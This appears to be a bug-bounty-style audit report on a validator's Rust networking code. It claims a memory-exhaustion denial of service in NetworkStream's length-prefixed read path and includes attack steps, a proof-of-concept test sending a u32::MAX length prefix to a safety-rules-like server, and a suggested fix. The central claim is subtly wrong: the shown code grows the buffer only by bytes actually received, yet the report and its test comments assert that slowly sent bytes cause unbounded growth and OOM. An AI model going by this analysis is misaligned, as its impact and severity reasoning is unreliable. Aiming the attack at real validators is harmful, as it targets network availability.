# Audit Report

## Title
Memory Exhaustion DoS in NetworkStream via Unbounded Buffer Growth in Safety-Rules Service

## Summary
The `NetworkStream::read_buffer()` function in `secure/net/src/lib.rs` lacks maximum message size validation, allowing an attacker to trigger unbounded buffer growth by sending a malicious length prefix. This affects the safety-rules consensus service and can cause validator unavailability through memory exhaustion.

## Finding Description

The security question asks about integer overflow in the comparison at lines 489-492. **The comparison itself does not overflow** - it's a straightforward usize comparison that works correctly. However, investigation reveals a more severe vulnerability: **lack of maximum message size validation** in the read path. [1](#0-0) 

The `read_buffer()` function reads a 4-byte length prefix from the network, casts it to usize as `data_size`, and waits until enough data arrives. There is no validation that `data_size` is within reasonable bounds. [2](#0-1) 

The `read()` function continuously appends data to `self.buffer` until the message is complete. If an attacker sends `data_size = u32::MAX` (4,294,967,295 bytes), the buffer grows without limit until memory exhaustion occurs.

**Attack Propagation:** [3](#0-2) 

The safety-rules service uses `NetworkServer` in an infinite loop. An attacker connecting to this service can:

1. Send 4 bytes: `[0xFF, 0xFF, 0xFF, 0xFF]` (u32::MAX in little-endian)
2. Keep connection alive, sending data slowly (e.g., 1 byte every few seconds to avoid timeout)
3. The victim's buffer grows continuously via `self.buffer.extend()` at line 443
4. Memory exhaustion causes the safety-rules service to crash or become unresponsive
5. The validator cannot participate in consensus (cannot vote or propose blocks)

**Contrast with write path protection:** [4](#0-3) 

The write path validates that data size is less than u32::MAX, but the read path has no corresponding maximum size check.

## Impact Explanation

**Severity: High** (potentially Critical depending on deployment)

This breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits."

**Impact on Consensus:**
- Safety-rules is a critical consensus component that enforces voting safety rules
- If DoS'd, the affected validator cannot participate in consensus
- Multiple affected validators could impact network liveness

**Classification:**
- If accessible: "Validator node slowdowns" → **High Severity** ($50,000)
- If widespread: "Total loss of liveness/network availability" → **Critical Severity** ($1,000,000)

**Note:** While "network-level DoS attacks are out of scope," this is an **application-level protocol vulnerability** (missing input validation) that happens to enable DoS, similar to parser bugs or resource exhaustion flaws typically considered in-scope.

## Likelihood Explanation

**Likelihood: Medium-High (deployment-dependent)**

**Attacker Requirements:**
- Network access to safety-rules service port
- Ability to send TCP packets (trivial)
- No authentication required on NetworkStream layer

**Deployment Factors:**
- Safety-rules often runs on localhost (harder to exploit)
- Some deployments may expose it on private networks (easier to exploit)
- Misconfigured deployments exposing it publicly (high risk)

**Exploitation Complexity:** LOW - single TCP connection with crafted 4-byte header

## Recommendation

Add maximum message size validation in `read_buffer()` before accepting the declared length:

```rust
fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // ADD MAXIMUM SIZE CHECK
    const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB (aligned with network constants)
    if data_size > MAX_MESSAGE_SIZE {
        // Log error and return error instead of growing buffer indefinitely
        return Vec::new(); // Or return Result<Vec<u8>, Error> with DataTooLarge error
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

Additionally, modify the signature to return `Result<Vec<u8>, Error>` to properly propagate the error rather than silently returning empty vector.

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr};
    use std::thread;
    use std::time::Duration;

    #[test]
    fn test_memory_exhaustion_attack() {
        // Start safety-rules-like server
        let server_port = 16191;
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        let mut server = NetworkServer::new("test-safety-rules".to_string(), server_addr, 5000);
        
        // Spawn server thread that will try to read
        let server_thread = thread::spawn(move || {
            // This should fail due to memory exhaustion or timeout
            let _ = server.read();
        });

        thread::sleep(Duration::from_millis(100)); // Let server start

        // Attacker connects and sends malicious length
        let mut attacker_stream = TcpStream::connect(server_addr).unwrap();
        
        // Send u32::MAX as length (4,294,967,295 bytes expected)
        let malicious_length: u32 = u32::MAX;
        attacker_stream.write_all(&malicious_length.to_le_bytes()).unwrap();
        
        // Keep connection alive, send data slowly
        for _ in 0..100 {
            thread::sleep(Duration::from_millis(40));
            attacker_stream.write_all(&[0x41]).unwrap(); // Send 1 byte
        }
        
        // Server's buffer is now growing unboundedly
        // In production, this would continue until OOM
        
        server_thread.join().unwrap();
    }
}
```

**Notes:**
- The specific question about integer overflow at lines 489-492 is **not valid** - the comparison works correctly
- The actual vulnerability is the **missing size validation** allowing unbounded buffer growth
- This is a protocol-level bug in message framing, not a generic network flood attack
- Impact depends heavily on deployment configuration (network exposure of safety-rules service)

### Citations

**File:** secure/net/src/lib.rs (L430-451)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        let result = self.read_buffer();
        if !result.is_empty() {
            return Ok(result);
        }

        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
    }
```

**File:** secure/net/src/lib.rs (L459-474)
```rust
    pub fn write(&mut self, data: &[u8]) -> Result<(), Error> {
        let u32_max = u32::MAX as usize;
        if u32_max <= data.len() {
            return Err(Error::DataTooLarge(data.len()));
        }
        let data_len = data.len() as u32;
        trace!("Attempting to write length, {},  to the stream", data_len);
        self.write_all(&data_len.to_le_bytes())?;
        trace!("Attempting to write data, {},  to the stream", data_len);
        self.write_all(data)?;
        trace!(
            "Successfully wrote length, {}, and data to the stream",
            data_len
        );
        Ok(())
    }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-55)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}

fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```
